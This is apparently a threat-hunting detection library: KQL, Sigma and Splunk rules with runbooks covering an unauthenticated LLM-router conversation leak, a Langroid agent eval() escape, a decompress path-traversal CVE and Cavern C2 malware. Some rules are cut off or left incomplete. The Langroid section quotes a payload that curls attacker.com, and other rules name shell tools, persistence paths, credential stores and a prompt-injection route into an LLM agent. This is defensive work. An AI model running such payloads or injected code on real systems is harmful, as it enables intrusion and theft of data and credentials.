Hunts a single source sequentially pulling many distinct /api/usage/request-details/:id records — each returns another user's full conversation (system prompts, user/assistant messages, tool calls, reasoning traces) with no auth. High distinct-UUID count or large cumulative response volume from one src indicates mass conversation exfiltration. Rationale: /api/usage/request-details/:id returns full cross-user conversation contents per the advisory; a single src pulling 25+ distinct request UUIDs (200 responses) in 30 minutes is enumeration/exfil of other users' sessions, distinguishable from a user reviewing their own handful of requests. Cross-checked against: • https://github.com/advisories/GHSA-vjc7-jrh9-9j86 • https://github.com/decolua/9router/issues/431

Sample which conversations were pulled (any containing embedded secrets in prompts?). 2) Contain: block the source, gate /api/usage/request-details behind auth, upgrade to >=0.4.45; notify data-owner/DPO as user prompt/response content (potentially PII/secrets) was disclosed. 3) Hunt: correlate the same src with /api/usage/stats (key leak) and /api/providers mutation; review any secrets/tokens that appeared inside leaked prompts and rotate them.

Langroid TableChatAgent/VectorStore eval() RCE: Python spawns OS shell/download child AIExploitation High
Hunts the CVE-2026-54769 sandbox escape where a Langroid agent's eval(code, vars, {}) executes an LLM-supplied expression like __import__('os').system('curl http://attacker.com/pwned'). The observable is the Langroid python interpreter directly spawning a shell / curl / wget / touch child — behaviour a data-analysis agent should never produce. Rationale: Anchors on the article's exact payload primitives (__import__, os.system, PoC canary /tmp/rce_success_table) and the vulnerable module names (table_chat_agent, pandas_eval, vector_store) as the parent context — a Langroid python interpreter spawning a shell or curl is the direct footprint of the eval() escape and is not normal agent behaviour. Cross-checked against: • https://github.com/advisories/GHSA-q9p7-wqxg-mrhc • https://github.com/langroid/langroid/blob/main/langroid/agent/special/table_chat_agent.py#L239 • https://github.com/langroid/langroid/blob/main/langroid/vector_store/base.py#L225
ATT&CKT1059.006 T1203
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate Langroid/LLM agents that shell out to run pandas subprocesses or system tools during normal analysis
  • Data-science notebooks where python calls os.system('curl ...') to fetch datasets to /tmp
  • CI runners executing python that invoke curl/wget for dependency fetches
  • Custom internal agents that intentionally use subprocess for file conversion (touch/nc for health checks)
Suppression filter
| where not(InitiatingProcessCommandLine has_any ("ci-runner","conftest","pytest") and ProcessCommandLine has "artifactory")
Response runbook
1) Triage: pull the full parent python command line and the child cmdline — confirm the child references a network fetch or filesystem write and the python process is a Langroid/LLM agent (site-packages/langroid on the folder path). Capture destination host. 2) Contain: isolate the host, kill the agent process tree, and rotate any DB/API credentials the agent process held (the agent runs with host privileges). 3) Hunt: search DeviceNetworkEvents for the child's egress destination across the fleet, look for /tmp/rce_success* or other agent-written files, and verify the Langroid version is <= 0.65.1 (upgrade to patched release).
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName matches regex @"(?i)^python[0-9.]*$"
| where FileName in~ ("sh","bash","dash","curl","wget","touch","nc","ncat")
| where ProcessCommandLine has_any ("__import__","os.system","/tmp/rce_success","curl http","wget http")
    or InitiatingProcessCommandLine has_any ("langroid","table_chat_agent","pandas_eval","vector_store")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ParentProcessName matches regex @"(?i)^python[0-9.]*$" or ParentProcessName has "python"
| where TargetProcessName has_any ("sh","bash","dash","curl","wget","touch","nc","ncat")
| where TargetProcessCommandLine has_any ("__import__","os.system","/tmp/rce_success","curl http","wget http")
    or ParentProcessCommandLine has_any ("langroid","table_chat_agent","pandas_eval","vector_store")
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, TargetProcessName, TargetProcessCommandLine

Native Python egress from Langroid agent to non-LLM host (urllib/requests eval exfil) AICommand & Control Medium
Hunts the C2/exfil half of CVE-2026-54769 where the eval() payload uses in-process python (urllib/requests) or a spawned curl to reach an attacker host rather than a legitimate LLM API. Flags outbound connections initiated by a Langroid python process to destinations outside the known LLM/provider allowlist. Rationale: Scopes egress to the Langroid python process (folder/cmdline references langroid, table_chat_agent, pandas_eval) and subtracts the legitimate LLM-provider allowlist derived from the article's own config (api.deepseek.com), so any remaining public destination is a candidate C2/exfil channel from the eval() escape. ASIM ImNetworkSession has no process-attribution column, so the Sentinel variant is host-scoped (SrcHostname) and intentionally broader — pair it with the process-tree UC for fidelity. Cross-checked against: • https://github.com/advisories/GHSA-q9p7-wqxg-mrhc
ATT&CKT1071.001 T1041
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Langroid agents legitimately calling non-mainstream/self-hosted LLM endpoints or local model gateways not in the allowlist
  • Agent tools that fetch web content (web-search plugins) to public sites as part of normal operation
  • Telemetry/observability agents (LangSmith, Weights & Biases) that the python process reports to
  • pip/conda dependency resolution reaching PyPI or CDN mirrors from the same interpreter
Response runbook
1) Triage: identify the destination (RemoteUrl/RemoteIP), enrich against threat intel, and confirm the initiating python process is a Langroid agent. Check whether the same host also showed the python->shell RCE signal. 2) Contain: block the destination at the egress proxy/firewall and isolate the host if the destination is unknown/malicious. 3) Hunt: pivot on the destination across all agents, review the agent's transcript/prompt logs for injection strings, and confirm no data (DB dumps, files) left via that channel.
let LLMAllow = dynamic(["openai.com","api.deepseek.com","deepseek.com","anthropic.com","googleapis.com","cohere.ai","huggingface.co","azure.com","openai.azure.com"]);
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName matches regex @"(?i)^python[0-9.]*$" or InitiatingProcessFileName in~ ("curl","wget")
| where RemoteIPType == "Public"
| where InitiatingProcessCommandLine has_any ("langroid","table_chat_agent","pandas_eval","vector_store") or InitiatingProcessFolderPath has "langroid"
| extend Dest = tolower(iff(isnotempty(RemoteUrl), RemoteUrl, RemoteIP))
| where not(Dest has_any (LLMAllow))
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemoteUrl, RemotePort
| order by Timestamp desc
let LLMAllow = dynamic(["openai.com","deepseek.com","anthropic.com","googleapis.com","cohere.ai","huggingface.co","azure.com"]);

| order by FirstSeen desc

Post-RCE tool staging: curl/wget download to ephemeral path spawned by Langroid python/shell AIInstallation Medium
Hunts second-stage ingress tool transfer after the CVE-2026-54769 eval() RCE, where the initial os.system() payload pulls a follow-on binary/script into /tmp, /dev/shm, or /var/tmp. Flags curl/wget downloads with an output path in an ephemeral directory that were spawned by a python interpreter or shell. Rationale: Chains the article's os.system('curl http://attacker.com/pwned') primitive to the classic follow-on: the same shell/python fetches a stage-2 payload into an ephemeral directory. Requiring parent=python/shell AND a URL AND an ephemeral output path keeps this article-specific and much tighter than a bare curl-to-internet rule. Cross-checked against: • https://github.com/advisories/GHSA-q9p7-wqxg-mrhc
ATT&CKT1105 T1059.004
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Build/CI scripts using curl|wget to stage tools into /tmp during pipeline runs
  • Package installers and bootstrap scripts (get-pip, rustup, nvm) downloading to /tmp then executing
  • Container entrypoints that fetch config/certs into /tmp on start
  • Admin troubleshooting one-liners pulling diagnostics scripts to /tmp
Suppression filter
| where not(InitiatingProcessCommandLine has_any ("get-pip","rustup","nvm","bootstrap") or ProcessCommandLine has_any ("pip install","artifactory","nexus"))
Response runbook
1) Triage: extract the downloaded URL and target filename, hash the file if still present, and determine if the parent chain traces back to a Langroid agent process. 2) Contain: isolate the host, quarantine the staged file, and block the source URL/domain at egress. 3) Hunt: search for execution of the staged file (chmod +x then exec, or interpreter run), persistence writes (cron, systemd, ~/.bashrc), and the same URL/hash across other agent hosts.

Vulnerable @xhmikosr/decompress or decompress package present (CVE-2026-53486) AIWeaponization High
Inventory hunt that surfaces hosts carrying a decompress version affected by CVE-2026-53486 (@xhmikosr/decompress < 10.2.1, >= 11.0.0 < 11.1.3, or unmaintained decompress <= 4.2.1). These hosts can be pushed a crafted archive that writes/reads files outside the extraction directory, so they are the exposure baseline for the runtime detections below. Rationale: Keys off the exact CVE id CVE-2026-53486 from the advisory; TVM already tracks the fixed versions (10.2.1 / 11.1.3) so this is a clean deploy-blast-radius hunt rather than a behavioural one. Cross-checked against: • https://github.com/advisories/GHSA-mp2f-45pm-3cg9 • https://advisories.gitlab.com/npm/decompress/CVE-2026-53486/ • https://vulert.com/vuln-db/CVE-2026-53486
ATT&CKT1195.001
Data sources
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Package present but pinned behind a build stage that never extracts untrusted archives (dev-only devDependency)
  • Transitive copy already deduped to a fixed version at runtime while the tree still lists the vulnerable range
  • Container image layer cached with the old version but overridden at runtime
  • Air-gapped host that only ever extracts internally-produced archives
  • SBOM lists the package but the code path is dead / behind a disabled feature flag
Response runbook
Step 1 (triage): confirm the resolved runtime version (npm ls @xhmikosr/decompress / decompress) — a lockfile range is not the installed version. Step 2 (contain): for any host that extracts network-sourced archives, bump to @xhmikosr/decompress 11.1.3 (or 10.2.1) and, as interim mitigation, run extraction as a non-root user. Step 3 (hunt): pivot to the runtime UCs below on the same DeviceName to check whether an escape has already been attempted (symlink/hardlink creation, writes to /etc/cron.d, /etc/ld.so.preload, ~/.ssh/authorized_keys).

Node archive-extraction process writing to Linux persistence paths (decompress dir-escape) AIInstallation Medium
Hunts a Node.js process (the runtime that hosts the vulnerable decompress library) creating or modifying files under canonical persistence locations — cron drop-dirs, systemd unit dirs, sudoers.d, and SSH authorized_keys. CVE-2026-53486 lets a crafted archive escape the extraction root and land an entry anywhere the process can write; these directories are the highest-value landing zones and none are ever a legitimate output target for archive extraction. Rationale: Article states a crafted entry can be written 'outside that directory'; a node process (the decompress host) writing into cron/systemd/sudoers/authorized_keys is never a legitimate extraction target, so the destination path itself is the escape signal. Persistence paths are the MITRE-canonical landing zones for a write-anywhere primitive, not verbatim advisory strings — flagged as hunting for that reason. Cross-checked against: • https://github.com/advisories/GHSA-mp2f-45pm-3cg9 • https://github.com/advisories/GHSA-qgfr-5hqp-vrw9
ATT&CKT1053.003 T1098.004 T1543.002
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • A Node-based config-management/IaC agent (e.g. a homegrown deployer) that legitimately writes systemd units
  • Node process management tools like pm2 generating a systemd unit via 'pm2 startup'
  • A CI runner written in Node that provisions cron jobs as part of a build
  • Cloud-init or provisioning scripts that shell out to node to template a sudoers.d fragment
  • Developer tooling that writes ~/.ssh/authorized_keys during a workstation bootstrap
Suppression filter
| where InitiatingProcessCommandLine !has "pm2" and InitiatingProcessCommandLine !has_any ("startup","deploy")
Response runbook
Step 1 (triage): pull the InitiatingProcessCommandLine and parent chain — a legitimate extraction targets an app/tmp dir, not /etc; confirm whether an archive was fetched over the network moments before (correlate FileCreated of a .tar/.zip in a temp dir by the same node PID). Step 2 (contain): quarantine/rollback the written file (cron/unit/authorized_keys), kill the node process, and revoke any SSH key added. Step 3 (hunt): sweep the host for the symlink/hardlink escape UC and for setuid/ld.so.preload writes; check for outbound C2 from any cron/systemd payload just dropped.

        or (FileName =~ "authorized_keys" and FolderPath has "/.ssh"))
| where InitiatingProcessParentFileName !in~ ("dpkg","apt","apt-get","rpm","yum","dnf","cloud-init","ansible")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, ActionType, FileName, FolderPath, InitiatingProcessParentFileName
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(14d)
| where ActingProcessName has_any ("node","nodejs")
| where TargetFilePath has_any ("/etc/cron.d","/etc/cron.hourly","/etc/cron.daily","/etc/cron.weekly","/etc/systemd/system","/usr/lib/systemd/system","/etc/sudoers.d","/.ssh/authorized_keys")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, DvcAction, TargetFilePath
| order by TimeGenerated desc
title: Node Archive Extraction Writing to Linux Persistence Path
id: 6f2a1b7c-3d4e-4a91-b8c2-9e0f5a1d2c33
description: Node.js process (host of vulnerable @xhmikosr/decompress, CVE-2026-53486) creating a file under cron, systemd, sudoers.d or SSH authorized_keys, indicating an archive-extraction directory escape used for persistence.
references:
  - https://github.com/advisories/GHSA-mp2f-45pm-3cg9
author: SOC Detection Engineering
date: 2026/07/07
tags:
  - attack.persistence
  - attack.t1053.003
  - attack.t1098.004
  - attack.t1543.002
logsource:
  category: file_event
  product: linux
detection:
  selection_proc:
    Image|endswith:
      - '/node'
      - '/nodejs'
  selection_path:
    TargetFilename|contains:
      - '/etc/cron.d/'
      - '/etc/cron.hourly/'
      - '/etc/cron.daily/'
      - '/etc/systemd/system/'
      - '/usr/lib/systemd/system/'
      - '/etc/sudoers.d/'
      - '/.ssh/authorized_keys'
  condition: selection_proc and selection_path
level: high
source:linux.auditd @process.name:(node OR nodejs) (*cron.d* OR *cron.hourly* OR *cron.daily* OR *systemd/system* OR *sudoers.d* OR *authorized_keys*)
#event_simpleName=FileWritten ContextImageFileName=/(node|nodejs)$/i
| TargetFileName=/(\/etc\/cron\.(d|hourly|daily|weekly)\/|\/etc\/systemd\/system\/|\/usr\/lib\/systemd\/system\/|\/etc\/sudoers\.d\/|\/\.ssh\/authorized_keys)/i
| groupBy([aid, ComputerName, ContextImageFileName, TargetFileName], function=count())
Node extraction writing ld.so.preload or setuid/privileged path as root (CVE-2026-53486 privesc) AIInstallation High
Alerts when a Node.js process running as root writes /etc/ld.so.preload or drops into privileged binary dirs (/usr/local/sbin, /usr/local/bin) during archive extraction. CVE-2026-53486 applies file modes with 'mode & ~umask', preserving setuid/setgid bits, and lets entries escape the output dir — so a root-context extraction can plant a preloaded library or a setuid binary for privilege escalation. This is near-zero in normal operation. Rationale: Anchored to the advisory's mode-bit finding ('File modes were applied as mode & ~umask ... does not remove the setuid, setgid, or sticky bits ... matters when extraction runs as root'). ld.so.preload and setuid drops into /usr/local/s?bin are the canonical root-write privesc targets for that primitive; keyed on InitiatingProcessAccountName==root to keep FP near zero. Cross-checked against: • https://github.com/advisories/GHSA-mp2f-45pm-3cg9 • https://advisories.gitlab.com/npm/decompress/CVE-2026-53486/
ATT&CKT1548.001 T1574.006
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A root-run Node build tool legitimately installing a native addon into /usr/local/bin
  • node-gyp / install scripts placing compiled helpers under /usr/local during a package build
  • In-house deployment tooling written in Node that manages ld.so.conf.d for custom libs
  • Container entrypoint (running as root) that node-templates a binary into /usr/local/bin
  • Monitoring/APM agent installers shelling through node to drop a preload shim
Suppression filter
| where InitiatingProcessCommandLine !has "node-gyp" and InitiatingProcessCommandLine !has_any ("install","rebuild","prebuild")
Response runbook
Step 1 (triage): inspect the written file — dump /etc/ld.so.preload contents or stat the /usr/local binary for setuid/setgid bits; confirm no legitimate root-run build (node-gyp, npm install of a native module) explains it. Step 2 (contain): isolate the host, remove the preload entry / setuid binary, and rotate any credentials reachable from root on that box; if in a container, kill and rebuild from a patched image (decompress >= 11.1.3). Step 3 (hunt): review process executions immediately after the write for any binary that loaded the preloaded library or ran with elevated tokens, and check the same host for the symlink-escape and persistence-path UCs.
DeviceFileEvents
| where Timestamp > ago(14d)
| where InitiatingProcessFileName in~ ("node","nodejs")
| where InitiatingProcessAccountName =~ "root"
| where FolderPath has "/etc/ld.so.preload" or FileName =~ "ld.so.preload"
      or FolderPath has_any ("/usr/local/sbin","/usr/local/bin","/etc/ld.so.conf.d")
| where InitiatingProcessParentFileName !in~ ("dpkg","apt","apt-get","rpm","yum","dnf","make","cloud-init")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, ActionType, FileName, FolderPath, InitiatingProcessParentFileName
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(14d)
| where ActingProcessName has_any ("node","nodejs")
| where ActorUsername =~ "root"
| where TargetFilePath has_any ("/etc/ld.so.preload","/etc/ld.so.conf.d","/usr/local/sbin/","/usr/local/bin/")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, DvcAction, TargetFilePath
| order by TimeGenerated desc

Iran-Linked Hackers Use New Cavern C2 Framework to Target Israeli Organizations

The Hacker News
2026-07-06 16 use cases 6 techniques 6 kill-chain phases detected

An Iranian hacking group affiliated with Iran's Ministry of Intelligence and Security (MOIS) has been wielding a previously undocumented modular command-and-control (C2) framework dubbed Cavern (aka Cav3rn) targeting Israeli organizations. The activity, which has primarily singled out IT providers and government sectors, has been attributed to a threat cluster tracked by Check Point Research

Cavern Manticore uxtheme.dll side-load via WinDirStat/SysAid (Cavern Agent) AIInstallation High
Hunts the trojanized uxtheme.dll carrying the Cavern Agent, side-loaded against a legitimate signed binary (WinDirStat, delivered via SysAid's update feature) from a non-System32 directory. The real uxtheme.dll only ever loads from Windows system directories, so any load/drop from an application or temp path is anomalous. Rationale: Pivots on the article's named side-loaded artifact (uxtheme.dll = Cavern Agent) plus the invariant that the real uxtheme.dll only loads from Windows system dirs; corroborated by CyberSecurityNews naming WinDirStat as the signed host binary. Cross-checked against: • https://research.checkpoint.com/2026/cavern-manticore-exposing-iran-linked-modular-c2-framework/ • https://cybersecuritynews.com/cavern-manticore-abuses-sysaid-rmm-and-windirstat-dll-sideloading/
ATT&CKT1574.002
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Developer/test machines running a locally-built uxtheme.dll from a project output folder
  • Legacy theming utilities that ship their own uxtheme.dll copy
  • Portable-app launchers that stage system DLLs alongside the executable
  • Software packagers/installers momentarily extracting uxtheme.dll to a temp dir before moving to System32
Suppression filter
| where InitiatingProcessFolderPath !startswith @"C:\Program Files\Microsoft Visual Studio" and InitiatingProcessFileName !in~ ("devenv.exe","msbuild.exe")
Response runbook
1) Triage: pull the SHA256 and InitiatingProcess of the loading binary; verify whether the loader is windirstat.exe or a SysAid updater and whether the DLL is Microsoft-signed. Detonate/hash-check the uxtheme.dll against known-good. 2) Contain: isolate the host, block the file hash org-wide, and suspend the SysAid update/RMM channel pending review since it is the delivery vector. 3) Hunt: search all hosts for the same uxtheme.dll hash and for the Cavern module DLLs (n-HTCommp.dll, mhm.dll, db.dll, ode.dll, n-ten.dll, n-sws.dll) and for beaconing to hospitalinstallation.com.
DeviceImageLoadEvents
| where Timestamp > ago(30d)
| where FileName =~ "uxtheme.dll"
| where FolderPath !startswith @"C:\Windows\System32"
    and FolderPath !startswith @"C:\Windows\SysWOW64"
    and FolderPath !startswith @"C:\Windows\WinSxS"
| project Timestamp, DeviceName, FileName, FolderPath, SHA256,
          InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where TargetFileName =~ "uxtheme.dll"
| where TargetFilePath !startswith @"C:\Windows\"
| project TimeGenerated, DvcHostname, TargetFilePath, TargetFileSHA256,
          ActingProcessName, ActingProcessCommandLine
| order by TimeGenerated desc

description: Detects the trojanized uxtheme.dll (Cavern Agent) loaded from a directory other than the Windows system directories, indicating DLL side-loading against a signed host binary such as WinDirStat delivered via SysAid.

Cavern C2 module DLLs loaded (n-HTCommp/n-ten/n-sws/mhm/ode/db) AIInstallation High
Hunts on-disk presence or loading of the five Cavern post-exploitation modules and the n-HTCommp communication DLL fetched by the Cavern Agent. The n- prefixed Native-AOT modules (loaded via LoadLibraryA) carry highly-unusual filenames that rarely collide with legitimate software. Rationale: Uses the exact module filenames enumerated by Check Point Research; the n-HTCommp/n-ten/n-sws Native-AOT names are near-unique, giving high fidelity even though generic db.dll/ode.dll add some noise. Cross-checked against: • https://research.checkpoint.com/2026/cavern-manticore-exposing-iran-linked-modular-c2-framework/ • https://cybersecuritynews.com/cavern-manticore-abuses-sysaid-rmm-and-windirstat-dll-sideloading/
ATT&CKT1574.002 T1129
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Third-party apps shipping a generic db.dll or ode.dll (ODE solver / database helper) unrelated to Cavern
  • Internal line-of-business tools that name a helper module mhm.dll
  • Backup/AV tooling temporarily staging DLLs with short names
  • Developer build outputs containing db.dll in bin directories
Suppression filter
| where not (FileName in~ ("db.dll","ode.dll") and (FolderPath startswith @"C:\Program Files" or InitiatingProcessFolderPath startswith @"C:\Program Files"))
Response runbook
1) Triage: prioritize hits on n-HTCommp.dll/n-ten.dll/n-sws.dll (near-unique). Capture the loading process, SHA256, and file path; check whether the loader is the same host process as any uxtheme.dll side-load. 2) Contain: isolate the host, block all matching module hashes, and capture memory before reboot to preserve AppDomain-isolated modules. 3) Hunt: correlate the loading host with outbound traffic to hospitalinstallation.com and with LDAP/SMB brute-force (ode.dll/n-ten.dll behaviours) and SOCKS5/WebSocket tunneling (n-sws.dll) across the environment.
DeviceImageLoadEvents
| where Timestamp > ago(30d)
| where FileName in~ ("n-HTCommp.dll","n-ten.dll","n-sws.dll","mhm.dll","ode.dll","db.dll")
| project Timestamp, DeviceName, FileName, FolderPath, SHA256,
          InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where TargetFileName in~ ("n-HTCommp.dll","n-ten.dll","n-sws.dll","mhm.dll","ode.dll","db.dll")
| project TimeGenerated, DvcHostname, TargetFileName, TargetFilePath, TargetFileSHA256,
          ActingProcessName, ActingProcessCommandLine
| order by TimeGenerated desc

Cavern Manticore C2 beacon to hospitalinstallation.com (HTTPS/WebSocket) AICommand & Control High
Hunts endpoint, DNS, and proxy telemetry for connections to the Cavern C2 server hospitalinstallation[.]com, which the n-HTCommp.dll communication module contacts over HTTPS or WebSocket to pull post-exploitation modules. Any resolution/connection to this domain is a direct compromise indicator. Rationale: Pivots on the single confirmed network IOC (hospitalinstallation[.]com), cross-checked across Check Point, The Hacker News, and CyberSecurityNews; domain-based so it fires regardless of the HTTPS-vs-WebSocket transport choice. Cross-checked against: • https://research.checkpoint.com/2026/cavern-manticore-exposing-iran-linked-modular-c2-framework/ • https://thehackernews.com/2026/07/iran-linked-hackers-use-new-cavern-c2.html • https://cybersecuritynews.com/cavern-manticore-abuses-sysaid-rmm-and-windirstat-dll-sideloading/
ATT&CKT1071.001 T1573
Data sourcesNetwork_Resolution.DNS
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Security researchers/sandbox VMs deliberately resolving the IOC for analysis
  • Threat-intel enrichment tooling performing passive-DNS lookups of the domain
  • Proxy category-lookup services pre-fetching the domain for classification
  • A sinkholed version of the domain being resolved by internal DNS after takedown
Suppression filter
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe") and InitiatingProcessFolderPath !has @"\Windows Defender\"
Response runbook
1) Triage: identify the initiating process for the connection/resolution; if it is uxtheme.dll's host process (windirstat.exe/SysAid updater) treat as confirmed. Note RemoteIP for infrastructure pivoting. 2) Contain: sinkhole/block hospitalinstallation.com and its resolved IPs at DNS and egress, then isolate every host that resolved it. 3) Hunt: on each beaconing host look for the uxtheme.dll side-load and Cavern module DLLs, and expand to second-hop IT-provider hosts given the supply-chain lateral movement pattern described in the report.
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteUrl has "hospitalinstallation.com"
| project Timestamp, DeviceName, RemoteUrl, RemoteIP, RemotePort,
          InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine
| order by Timestamp desc
union isfuzzy=true
  (DnsEvents
    | where TimeGenerated > ago(30d)
    | where Name has "hospitalinstallation.com"
    | project TimeGenerated, Host=Computer, SrcIp=ClientIP, Indicator=Name, Src="DNS"),
  (CommonSecurityLog
    | where TimeGenerated > ago(30d)
    | where DestinationHostName has "hospitalinstallation.com" or RequestURL has "hospitalinstallation.com"
    | project TimeGenerated, Host=SourceHostName, SrcIp=SourceIP, Indicator=coalesce(DestinationHostName, RequestURL), Src="Proxy")
| order by TimeGenerated desc

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
| tstats summariesonly=false count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
Network connections to article IPs / domains Command & Control High
Outbound traffic to attacker infrastructure named in the article.
ATT&CKT1071
Data sourcesNetwork_Traffic.All_Traffic Web Network_Resolution.DNS DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where RemoteIP in ("") or RemoteUrl has_any ("hospitalinstallation.com")
| project Timestamp, DeviceName, ActionType, RemoteIP, RemotePort, RemoteUrl,
          InitiatingProcessFileName, InitiatingProcessCommandLine
let BadIPs     = dynamic([""]);
let BadDomains = dynamic(["hospitalinstallation.com"]);
ImNetworkSession
| where TimeGenerated > ago(7d)
| where DstIpAddr in (BadIPs)
   or Url has_any (BadDomains)
| project TimeGenerated, DvcHostname, DstIpAddr, DstPortNumber, Url, NetworkProtocol
| order by TimeGenerated desc

title: Infostealer - Non-Browser Process Accessing Browser Credential Stores
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d01
status: experimental
description: |
    Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies
    SQLite databases from Chrome/Edge/Firefox profile directories. Any
    non-browser process touching these files is a high-fidelity signal.
references:
    - https://attack.mitre.org/techniques/T1539/
    - https://attack.mitre.org/techniques/T1555/003/
author: Clankerusecase
date: 2026/05/02

    - attack.t1555.003

    product: windows

    selection_path:
        TargetFilename|contains:
            - '\Google\Chrome\User Data\'
            - '\Microsoft\Edge\User Data\'
            - '\Mozilla\Firefox\Profiles\'
    selection_file:
        TargetFilename|endswith:
            - '\Login Data'
            - '\Cookies'
            - '\logins.json'
            - '\cookies.sqlite'
    filter_browser:
        Image|endswith:
            - '\chrome.exe'
            - '\msedge.exe'
            - '\firefox.exe'
            - '\brave.exe'

Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2025-52691", "CVE-2025-68613", "CVE-2025-9316", "CVE-2025-34291", "CVE-2025-54068", "CVE-2026-55200", "CVE-2026-46817")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2025-52691", "CVE-2025-68613", "CVE-2025-9316", "CVE-2025-34291", "CVE-2025-54068", "CVE-2026-55200", "CVE-2026-46817")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

title: PsExec / SMB Lateral Movement Tooling Execution
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d03
status: experimental
description: |
    PsExec, paexec, smbexec, csexec, remcom — admin-grade tooling that

references:
    - https://attack.mitre.org/techniques/T1021/002/
    - https://attack.mitre.org/techniques/T1569/002/
author: Clankerusecase
date: 2026/05/02

logsource:

